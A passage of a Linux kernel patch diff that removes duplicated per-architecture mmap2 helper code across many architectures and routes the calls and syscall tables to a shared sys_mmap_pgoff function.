<asm\/unistd.h>\n \n-\/* common code for old and new mmaps *\/\n-static inline long do_mmap2(\n-\tunsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags,\n-\tunsigned long fd, unsigned long pgoff)\n-{\n-\tint error = -EBADF;\n-\tstruct file * file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n-asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags,\n-\tunsigned long fd, unsigned long pgoff)\n-{\n-\treturn do_mmap2(addr, len, prot, flags, fd, pgoff);\n-}\n-\n \/*\n  * Perform the select(nd, in, out, ex, tv) and mmap() system\n  * calls. Linux\/m68k cloned Linux\/i386, which didn't use to be able to\n@@ -87,57 +54,11 @@ asmlinkage int old_mmap(struct mmap_arg_struct *arg)\n \tif (a.offset & ~PAGE_MASK)\n \t\tgoto out;\n \n-\ta.flags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\n-\terror = do_mmap2(a.addr, a.len, a.prot, a.flags, a.fd, a.offset >> PAGE_SHIFT);\n-out:\n-\treturn error;\n-}\n-\n-#if 0 \/* DAVIDM - do we want this *\/\n-struct mmap_arg_struct64 {\n-\t__u32 addr;\n-\t__u32 len;\n-\t__u32 prot;\n-\t__u32 flags;\n-\t__u64 offset; \/* 64 bits *\/\n-\t__u32 fd;\n-};\n-\n-asmlinkage long sys_mmap64(struct mmap_arg_struct64 *arg)\n-{\n-\tint error = -EFAULT;\n-\tstruct file * file = NULL;\n-\tstruct mmap_arg_struct64 a;\n-\tunsigned long pgoff;\n-\n-\tif (copy_from_user(&a, arg, sizeof(a)))\n-\t\treturn -EFAULT;\n-\n-\tif ((long)a.offset & ~PAGE_MASK)\n-\t\treturn -EINVAL;\n-\n-\tpgoff = a.offset >> PAGE_SHIFT;\n-\tif ((a.offset >> PAGE_SHIFT) != pgoff)\n-\t\treturn -EINVAL;\n-\n-\tif (!(a.flags & MAP_ANONYMOUS)) {\n-\t\terror = -EBADF;\n-\t\tfile = fget(a.fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\ta.flags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, a.addr, a.len, a.prot, a.flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\tif (file)\n-\t\tfput(file);\n+\terror = sys_mmap_pgoff(a.addr, a.len, a.prot, a.flags, a.fd,\n+\t\t\t       a.offset >> PAGE_SHIFT);\n out:\n \treturn error;\n }\n-#endif\n \n struct sel_arg_struct {\n \tunsigned long n;\ndiff --git a\/arch\/h8300\/kernel\/syscalls.S b\/arch\/h8300\/kernel\/syscalls.S\nindex 4eb67faac633..2d69881eda6a 100644\n--- a\/arch\/h8300\/kernel\/syscalls.S\n+++ b\/arch\/h8300\/kernel\/syscalls.S\n@@ -206,7 +206,7 @@ SYMBOL_NAME_LABEL(sys_call_table)\n \t.long SYMBOL_NAME(sys_ni_syscall)\t\/* streams2 *\/\n \t.long SYMBOL_NAME(sys_vfork)            \/* 190 *\/\n \t.long SYMBOL_NAME(sys_getrlimit)\n-\t.long SYMBOL_NAME(sys_mmap2)\n+\t.long SYMBOL_NAME(sys_mmap_pgoff)\n \t.long SYMBOL_NAME(sys_truncate64)\n \t.long SYMBOL_NAME(sys_ftruncate64)\n \t.long SYMBOL_NAME(sys_stat64)\t\t\/* 195 *\/\ndiff --git a\/arch\/ia64\/kernel\/sys_ia64.c b\/arch\/ia64\/kernel\/sys_ia64.c\nindex 92ed83f34036..ae384a2974c2 100644\n--- a\/arch\/ia64\/kernel\/sys_ia64.c\n+++ b\/arch\/ia64\/kernel\/sys_ia64.c\n@@ -185,39 +185,6 @@ int ia64_mmap_check(unsigned long addr, unsigned long len,\n \treturn 0;\n }\n \n-static inline unsigned long\n-do_mmap2 (unsigned long addr, unsigned long len, int prot, int flags, int fd, unsigned long pgoff)\n-{\n-\tstruct file *file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\treturn -EBADF;\n-\n-\t\tif (!file->f_op || !file->f_op->mmap) {\n-\t\t\taddr = -ENODEV;\n-\t\t\tgoto out;\n-\t\t}\n-\t}\n-\n-\t\/* Careful about overflows.. *\/\n-\tlen = PAGE_ALIGN(len);\n-\tif (!len || len > TASK_SIZE) {\n-\t\taddr = -EINVAL;\n-\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\taddr = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-out:\tif (file)\n-\t\tfput(file);\n-\treturn addr;\n-}\n-\n \/*\n  * mmap2() is like mmap() except that the offset is expressed in units\n  * of PAGE_SIZE (instead of bytes).  This allows to mmap2() (pieces\n@@ -226,7 +193,7 @@ out:\tif (file)\n asmlinkage unsigned long\n sys_mmap2 (unsigned long addr, unsigned long len, int prot, int flags, int fd, long pgoff)\n {\n-\taddr = do_mmap2(addr, len, prot, flags, fd, pgoff);\n+\taddr = sys_mmap_pgoff(addr, len, prot, flags, fd, pgoff);\n \tif (!IS_ERR((void *) addr))\n \t\tforce_successful_syscall_return();\n \treturn addr;\n@@ -238,7 +205,7 @@ sys_mmap (unsigned long addr, unsigned long len, int prot, int flags, int fd, lo\n \tif (offset_in_page(off) != 0)\n \t\treturn -EINVAL;\n \n-\taddr = do_mmap2(addr, len, prot, flags, fd, off >> PAGE_SHIFT);\n+\taddr = sys_mmap_pgoff(addr, len, prot, flags, fd, off >> PAGE_SHIFT);\n \tif (!IS_ERR((void *) addr))\n \t\tforce_successful_syscall_return();\n \treturn addr;\ndiff --git a\/arch\/m32r\/kernel\/sys_m32r.c b\/arch\/m32r\/kernel\/sys_m32r.c\nindex 305ac852bbed..d3c865c5a6ba 100644\n--- a\/arch\/m32r\/kernel\/sys_m32r.c\n+++ b\/arch\/m32r\/kernel\/sys_m32r.c\n@@ -76,30 +76,6 @@ asmlinkage int sys_tas(int __user *addr)\n \treturn oldval;\n }\n \n-asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags,\n-\tunsigned long fd, unsigned long pgoff)\n-{\n-\tint error = -EBADF;\n-\tstruct file *file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n \/*\n  * sys_ipc() is the de-multiplexer for the SysV IPC calls..\n  *\ndiff --git a\/arch\/m32r\/kernel\/syscall_table.S b\/arch\/m32r\/kernel\/syscall_table.S\nindex aa3bf4cfab37..60536e271233 100644\n--- a\/arch\/m32r\/kernel\/syscall_table.S\n+++ b\/arch\/m32r\/kernel\/syscall_table.S\n@@ -191,7 +191,7 @@ ENTRY(sys_call_table)\n \t.long sys_ni_syscall\t\t\/* streams2 *\/\n \t.long sys_vfork\t\t\t\/* 190 *\/\n \t.long sys_getrlimit\n-\t.long sys_mmap2\n+\t.long sys_mmap_pgoff\n \t.long sys_truncate64\n \t.long sys_ftruncate64\n \t.long sys_stat64\t\t\/* 195 *\/\ndiff --git a\/arch\/m68k\/kernel\/sys_m68k.c b\/arch\/m68k\/kernel\/sys_m68k.c\nindex 7deb402bfc75..218f441de667 100644\n--- a\/arch\/m68k\/kernel\/sys_m68k.c\n+++ b\/arch\/m68k\/kernel\/sys_m68k.c\n@@ -29,37 +29,16 @@\n #include <asm\/page.h>\n #include <asm\/unistd.h>\n \n-\/* common code for old and new mmaps *\/\n-static inline long do_mmap2(\n-\tunsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags,\n-\tunsigned long fd, unsigned long pgoff)\n-{\n-\tint error = -EBADF;\n-\tstruct file * file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n \tunsigned long prot, unsigned long flags,\n \tunsigned long fd, unsigned long pgoff)\n {\n-\treturn do_mmap2(addr, len, prot, flags, fd, pgoff);\n+\t\/*\n+\t * This is wrong for sun3 - there PAGE_SIZE is 8Kb,\n+\t * so we need to shift the argument down by 1; m68k mmap64(3)\n+\t * (in libc) expects the last argument of mmap2 in 4Kb units.\n+\t *\/\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, pgoff);\n }\n \n \/*\n@@ -90,57 +69,11 @@ asmlinkage int old_mmap(struct mmap_arg_struct __user *arg)\n \tif (a.offset & ~PAGE_MASK)\n \t\tgoto out;\n \n-\ta.flags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\n-\terror = do_mmap2(a.addr, a.len, a.prot, a.flags, a.fd, a.offset >> PAGE_SHIFT);\n-out:\n-\treturn error;\n-}\n-\n-#if 0\n-struct mmap_arg_struct64 {\n-\t__u32 addr;\n-\t__u32 len;\n-\t__u32 prot;\n-\t__u32 flags;\n-\t__u64 offset; \/* 64 bits *\/\n-\t__u32 fd;\n-};\n-\n-asmlinkage long sys_mmap64(struct mmap_arg_struct64 *arg)\n-{\n-\tint error = -EFAULT;\n-\tstruct file * file = NULL;\n-\tstruct mmap_arg_struct64 a;\n-\tunsigned long pgoff;\n-\n-\tif (copy_from_user(&a, arg, sizeof(a)))\n-\t\treturn -EFAULT;\n-\n-\tif ((long)a.offset & ~PAGE_MASK)\n-\t\treturn -EINVAL;\n-\n-\tpgoff = a.offset >> PAGE_SHIFT;\n-\tif ((a.offset >> PAGE_SHIFT) != pgoff)\n-\t\treturn -EINVAL;\n-\n-\tif (!(a.flags & MAP_ANONYMOUS)) {\n-\t\terror = -EBADF;\n-\t\tfile = fget(a.fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\ta.flags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, a.addr, a.len, a.prot, a.flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\tif (file)\n-\t\tfput(file);\n+\terror = sys_mmap_pgoff(a.addr, a.len, a.prot, a.flags, a.fd,\n+\t\t\t       a.offset >> PAGE_SHIFT);\n out:\n \treturn error;\n }\n-#endif\n \n struct sel_arg_struct {\n \tunsigned long n;\ndiff --git a\/arch\/m68knommu\/kernel\/sys_m68k.c b\/arch\/m68knommu\/kernel\/sys_m68k.c\nindex efdd090778a3..b67cbc735a9b 100644\n--- a\/arch\/m68knommu\/kernel\/sys_m68k.c\n+++ b\/arch\/m68knommu\/kernel\/sys_m68k.c\n@@ -27,39 +27,6 @@\n #include <asm\/cacheflush.h>\n #include <asm\/unistd.h>\n \n-\/* common code for old and new mmaps *\/\n-static inline long do_mmap2(\n-\tunsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags,\n-\tunsigned long fd, unsigned long pgoff)\n-{\n-\tint error = -EBADF;\n-\tstruct file * file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n-asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags,\n-\tunsigned long fd, unsigned long pgoff)\n-{\n-\treturn do_mmap2(addr, len, prot, flags, fd, pgoff);\n-}\n-\n \/*\n  * Perform the select(nd, in, out, ex, tv) and mmap() system\n  * calls. Linux\/m68k cloned Linux\/i386, which didn't use to be able to\n@@ -88,9 +55,8 @@ asmlinkage int old_mmap(struct mmap_arg_struct *arg)\n \tif (a.offset & ~PAGE_MASK)\n \t\tgoto out;\n \n-\ta.flags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\n-\terror = do_mmap2(a.addr, a.len, a.prot, a.flags, a.fd, a.offset >> PAGE_SHIFT);\n+\terror = sys_mmap_pgoff(a.addr, a.len, a.prot, a.flags, a.fd,\n+\t\t\t\ta.offset >> PAGE_SHIFT);\n out:\n \treturn error;\n }\ndiff --git a\/arch\/m68knommu\/kernel\/syscalltable.S b\/arch\/m68knommu\/kernel\/syscalltable.S\nindex 23535cc415ae..486837efa3d7 100644\n--- a\/arch\/m68knommu\/kernel\/syscalltable.S\n+++ b\/arch\/m68knommu\/kernel\/syscalltable.S\n@@ -210,7 +210,7 @@ ENTRY(sys_call_table)\n \t.long sys_ni_syscall\t\/* streams2 *\/\n \t.long sys_vfork\t\t\/* 190 *\/\n \t.long sys_getrlimit\n-\t.long sys_mmap2\n+\t.long sys_mmap_pgoff\n \t.long sys_truncate64\n \t.long sys_ftruncate64\n \t.long sys_stat64\t\/* 195 *\/\ndiff --git a\/arch\/microblaze\/kernel\/sys_microblaze.c b\/arch\/microblaze\/kernel\/sys_microblaze.c\nindex 07cabed4b947..9f3c205fb75b 100644\n--- a\/arch\/microblaze\/kernel\/sys_microblaze.c\n+++ b\/arch\/microblaze\/kernel\/sys_microblaze.c\n@@ -62,46 +62,14 @@ out:\n \treturn error;\n }\n \n-asmlinkage long\n-sys_mmap2(unsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags,\n-\tunsigned long fd, unsigned long pgoff)\n-{\n-\tstruct file *file = NULL;\n-\tint ret = -EBADF;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file) {\n-\t\t\tprintk(KERN_INFO \"no fd in mmap\\r\\n\");\n-\t\t\tgoto out;\n-\t\t}\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\tret = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn ret;\n-}\n-\n asmlinkage long sys_mmap(unsigned long addr, unsigned long len,\n \t\t\tunsigned long prot, unsigned long flags,\n \t\t\tunsigned long fd, off_t pgoff)\n {\n-\tint err = -EINVAL;\n-\n-\tif (pgoff & ~PAGE_MASK) {\n-\t\tprintk(KERN_INFO \"no pagemask in mmap\\r\\n\");\n-\t\tgoto out;\n-\t}\n+\tif (pgoff & ~PAGE_MASK)\n+\t\treturn -EINVAL;\n \n-\terr = sys_mmap2(addr, len, prot, flags, fd, pgoff >> PAGE_SHIFT);\n-out:\n-\treturn err;\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, pgoff >> PAGE_SHIFT);\n }\n \n \/*\ndiff --git a\/arch\/microblaze\/kernel\/syscall_table.S b\/arch\/microblaze\/kernel\/syscall_table.S\nindex c1ab1dc10898..b96f365ea6b1 100644\n--- a\/arch\/microblaze\/kernel\/syscall_table.S\n+++ b\/arch\/microblaze\/kernel\/syscall_table.S\n@@ -196,7 +196,7 @@ ENTRY(sys_call_table)\n \t.long sys_ni_syscall\t\t\/* reserved for streams2 *\/\n \t.long sys_vfork\t\t\/* 190 *\/\n \t.long sys_getrlimit\n-\t.long sys_mmap2\t\t\t\/* mmap2 *\/\n+\t.long sys_mmap_pgoff\t\t\/* mmap2 *\/\n \t.long sys_truncate64\n \t.long sys_ftruncate64\n \t.long sys_stat64\t\t\/* 195 *\/\ndiff --git a\/arch\/mips\/kernel\/linux32.c b\/arch\/mips\/kernel\/linux32.c\nindex 1a2793efdc4e..f042563c924f 100644\n--- a\/arch\/mips\/kernel\/linux32.c\n+++ b\/arch\/mips\/kernel\/linux32.c\n@@ -67,28 +67,13 @@ SYSCALL_DEFINE6(32_mmap2, unsigned long, addr, unsigned long, len,\n \tunsigned long, prot, unsigned long, flags, unsigned long, fd,\n \tunsigned long, pgoff)\n {\n-\tstruct file * file = NULL;\n \tunsigned long error;\n \n \terror = -EINVAL;\n \tif (pgoff & (~PAGE_MASK >> 12))\n \t\tgoto out;\n-\tpgoff >>= PAGE_SHIFT-12;\n-\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\terror = -EBADF;\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\tif (file)\n-\t\tfput(file);\n-\n+\terror = sys_mmap_pgoff(addr, len, prot, flags, fd,\n+\t\t\t       pgoff >> (PAGE_SHIFT-12));\n out:\n \treturn error;\n }\ndiff --git a\/arch\/mips\/kernel\/syscall.c b\/arch\/mips\/kernel\/syscall.c\nindex fe0d79805603..c25b2e7dcb7b 100644\n--- a\/arch\/mips\/kernel\/syscall.c\n+++ b\/arch\/mips\/kernel\/syscall.c\n@@ -129,31 +129,6 @@ unsigned long arch_get_unmapped_area(struct file *filp, unsigned long addr,\n \t}\n }\n \n-\/* common code for old and new mmaps *\/\n-static inline unsigned long\n-do_mmap2(unsigned long addr, unsigned long len, unsigned long prot,\n-        unsigned long flags, unsigned long fd, unsigned long pgoff)\n-{\n-\tunsigned long error = -EBADF;\n-\tstruct file * file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n SYSCALL_DEFINE6(mips_mmap, unsigned long, addr, unsigned long, len,\n \tunsigned long, prot, unsigned long, flags, unsigned long,\n \tfd, off_t, offset)\n@@ -164,7 +139,7 @@ SYSCALL_DEFINE6(mips_mmap, unsigned long, addr, unsigned long, len,\n \tif (offset & ~PAGE_MASK)\n \t\tgoto out;\n \n-\tresult = do_mmap2(addr, len, prot, flags, fd, offset >> PAGE_SHIFT);\n+\tresult = sys_mmap_pgoff(addr, len, prot, flags, fd, offset >> PAGE_SHIFT);\n \n out:\n \treturn result;\n@@ -177,7 +152,7 @@ SYSCALL_DEFINE6(mips_mmap2, unsigned long, addr, unsigned long, len,\n \tif (pgoff & (~PAGE_MASK >> 12))\n \t\treturn -EINVAL;\n \n-\treturn do_mmap2(addr, len, prot, flags, fd, pgoff >> (PAGE_SHIFT-12));\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, pgoff >> (PAGE_SHIFT-12));\n }\n \n save_static_function(sys_fork);\ndiff --git a\/arch\/mn10300\/kernel\/entry.S b\/arch\/mn10300\/kernel\/entry.S\nindex a94e7ea3faa6..c9ee6c009d79 100644\n--- a\/arch\/mn10300\/kernel\/entry.S\n+++ b\/arch\/mn10300\/kernel\/entry.S\n@@ -578,7 +578,7 @@ ENTRY(sys_call_table)\n \t.long sys_ni_syscall\t\/* reserved for streams2 *\/\n \t.long sys_vfork\t\t\/* 190 *\/\n \t.long sys_getrlimit\n-\t.long sys_mmap2\n+\t.long sys_mmap_pgoff\n \t.long sys_truncate64\n \t.long sys_ftruncate64\n \t.long sys_stat64\t\/* 195 *\/\ndiff --git a\/arch\/mn10300\/kernel\/sys_mn10300.c b\/arch\/mn10300\/kernel\/sys_mn10300.c\nindex ec4100dfcb7d..17cc6ce04e84 100644\n--- a\/arch\/mn10300\/kernel\/sys_mn10300.c\n+++ b\/arch\/mn10300\/kernel\/sys_mn10300.c\n@@ -23,42 +23,13 @@\n \n #include <asm\/uaccess.h>\n \n-\/*\n- * memory mapping syscall\n- *\/\n-asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n-\t\t\t  unsigned long prot, unsigned long flags,\n-\t\t\t  unsigned long fd, unsigned long pgoff)\n-{\n-\tstruct file *file = NULL;\n-\tlong error = -EINVAL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\n-\terror = -EBADF;\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n asmlinkage long old_mmap(unsigned long addr, unsigned long len,\n \t\t\t unsigned long prot, unsigned long flags,\n \t\t\t unsigned long fd, unsigned long offset)\n {\n \tif (offset & ~PAGE_MASK)\n \t\treturn -EINVAL;\n-\treturn sys_mmap2(addr, len, prot, flags, fd, offset >> PAGE_SHIFT);\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd, offset >> PAGE_SHIFT);\n }\n \n struct sel_arg_struct {\ndiff --git a\/arch\/parisc\/kernel\/sys_parisc.c b\/arch\/parisc\/kernel\/sys_parisc.c\nindex 71b31957c8f1..9147391afb03 100644\n--- a\/arch\/parisc\/kernel\/sys_parisc.c\n+++ b\/arch\/parisc\/kernel\/sys_parisc.c\n@@ -110,37 +110,14 @@ unsigned long arch_get_unmapped_area(struct file *filp, unsigned long addr,\n \treturn addr;\n }\n \n-static unsigned long do_mmap2(unsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags, unsigned long fd,\n-\tunsigned long pgoff)\n-{\n-\tstruct file * file = NULL;\n-\tunsigned long error = -EBADF;\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file != NULL)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n asmlinkage unsigned long sys_mmap2(unsigned long addr, unsigned long len,\n \tunsigned long prot, unsigned long flags, unsigned long fd,\n \tunsigned long pgoff)\n {\n \t\/* Make sure the shift for mmap2 is constant (12), no matter what PAGE_SIZE\n \t   we have. *\/\n-\treturn do_mmap2(addr, len, prot, flags, fd, pgoff >> (PAGE_SHIFT - 12));\n+\treturn sys_mmap_pgoff(addr, len, prot, flags, fd,\n+\t\t\t      pgoff >> (PAGE_SHIFT - 12));\n }\n \n asmlinkage unsigned long sys_mmap(unsigned long addr, unsigned long len,\n@@ -148,7 +125,8 @@ asmlinkage unsigned long sys_mmap(unsigned long addr, unsigned long len,\n \t\tunsigned long offset)\n {\n \tif (!(offset & ~PAGE_MASK)) {\n-\t\treturn do_mmap2(addr, len, prot, flags, fd, offset >> PAGE_SHIFT);\n+\t\treturn sys_mmap_pgoff(addr, len, prot, flags, fd,\n+\t\t\t\t\toffset >> PAGE_SHIFT);\n \t} else {\n \t\treturn -EINVAL;\n \t}\ndiff --git a\/arch\/powerpc\/kernel\/syscalls.c b\/arch\/powerpc\/kernel\/syscalls.c\nindex c04832c4a02e..3370e62e43d4 100644\n--- a\/arch\/powerpc\/kernel\/syscalls.c\n+++ b\/arch\/powerpc\/kernel\/syscalls.c\n@@ -140,7 +140,6 @@ static inline unsigned long do_mmap2(unsigned long addr, size_t len,\n \t\t\tunsigned long prot, unsigned long flags,\n \t\t\tunsigned long fd, unsigned long off, int shift)\n {\n-\tstruct file * file = NULL;\n \tunsigned long ret = -EINVAL;\n \n \tif (!arch_validate_prot(prot))\n@@ -151,20 +150,8 @@ static inline unsigned long do_mmap2(unsigned long addr, size_t len,\n \t\t\tgoto out;\n \t\toff >>= shift;\n \t}\n-\t\t\n-\tret = -EBADF;\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tif (!(file = fget(fd)))\n-\t\t\tgoto out;\n-\t}\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n \n-\tdown_write(&current->mm->mmap_sem);\n-\tret = do_mmap_pgoff(file, addr, len, prot, flags, off);\n-\tup_write(&current->mm->mmap_sem);\n-\tif (file)\n-\t\tfput(file);\n+\tret = sys_mmap_pgoff(addr, len, prot, flags, fd, off);\n out:\n \treturn ret;\n }\ndiff --git a\/arch\/s390\/kernel\/compat_linux.c b\/arch\/s390\/kernel\/compat_linux.c\nindex 11556aa6bf17..22c9e557bb22 100644\n--- a\/arch\/s390\/kernel\/compat_linux.c\n+++ b\/arch\/s390\/kernel\/compat_linux.c\n@@ -624,33 +624,6 @@ struct mmap_arg_struct_emu31 {\n \tu32\toffset;\n };\n \n-\/* common code for old and new mmaps *\/\n-static inline long do_mmap2(\n-\tunsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags,\n-\tunsigned long fd, unsigned long pgoff)\n-{\n-\tstruct file * file = NULL;\n-\tunsigned long error = -EBADF;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:    \n-\treturn error;\n-}\n-\n-\n asmlinkage unsigned long\n old32_mmap(struct mmap_arg_struct_emu31 __user *arg)\n {\n@@ -664,7 +637,8 @@ old32_mmap(struct mmap_arg_struct_emu31 __user *arg)\n \tif (a.offset & ~PAGE_MASK)\n \t\tgoto out;\n \n-\terror = do_mmap2(a.addr, a.len, a.prot, a.flags, a.fd, a.offset >> PAGE_SHIFT); \n+\terror = sys_mmap_pgoff(a.addr, a.len, a.prot, a.flags, a.fd,\n+\t\t\t       a.offset >> PAGE_SHIFT);\n out:\n \treturn error;\n }\n@@ -677,7 +651,7 @@ sys32_mmap2(struct mmap_arg_struct_emu31 __user *arg)\n \n \tif (copy_from_user(&a, arg, sizeof(a)))\n \t\tgoto out;\n-\terror = do_mmap2(a.addr, a.len, a.prot, a.flags, a.fd, a.offset);\n+\terror = sys_mmap_pgoff(a.addr, a.len, a.prot, a.flags, a.fd, a.offset);\n out:\n \treturn error;\n }\ndiff --git a\/arch\/s390\/kernel\/sys_s390.c b\/arch\/s390\/kernel\/sys_s390.c\nindex e9d94f61d500..86a74c9c9e63 100644\n--- a\/arch\/s390\/kernel\/sys_s390.c\n+++ b\/arch\/s390\/kernel\/sys_s390.c\n@@ -32,32 +32,6 @@\n #include <asm\/uaccess.h>\n #include \"entry.h\"\n \n-\/* common code for old and new mmaps *\/\n-static inline long do_mmap2(\n-\tunsigned long addr, unsigned long len,\n-\tunsigned long prot, unsigned long flags,\n-\tunsigned long fd, unsigned long pgoff)\n-{\n-\tlong error = -EBADF;\n-\tstruct file * file = NULL;\n-\n-\tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-\tif (!(flags & MAP_ANONYMOUS)) {\n-\t\tfile = fget(fd);\n-\t\tif (!file)\n-\t\t\tgoto out;\n-\t}\n-\n-\tdown_write(&current->mm->mmap_sem);\n-\terror = do_mmap_pgoff(file, addr, len, prot, flags, pgoff);\n-\tup_write(&current->mm->mmap_sem);\n-\n-\tif (file)\n-\t\tfput(file);\n-out:\n-\treturn error;\n-}\n-\n \/*\n  * Perform the select(nd, in, out, ex, tv) and mmap() system\n  * calls. Linux for S\/390 isn't able to handle more than 5\n@@ -81,7 +55,7 @@ SYSCALL_DEFINE1(mmap2, struct mmap_arg_struct __user *, arg)\n \n \tif (copy_from_user(&a, arg, sizeof(a)))\n \t\tgoto out;\n-\terror = do_mmap2(a.addr, a.len, a.prot, a.flags, a.fd, a.offset);\n+\terror = sys_mmap_pgoff(a.addr, a.len, a.prot, a.flags, a.fd, a.offset);\n out:\n \treturn error;\n }\n@@ -98,7 +72,7 @@ SYSCALL_DEFINE1(s390_old_mmap, struct mmap_arg_struct __user *, arg)\n \tif (a.offset & ~PAGE_MASK)\n 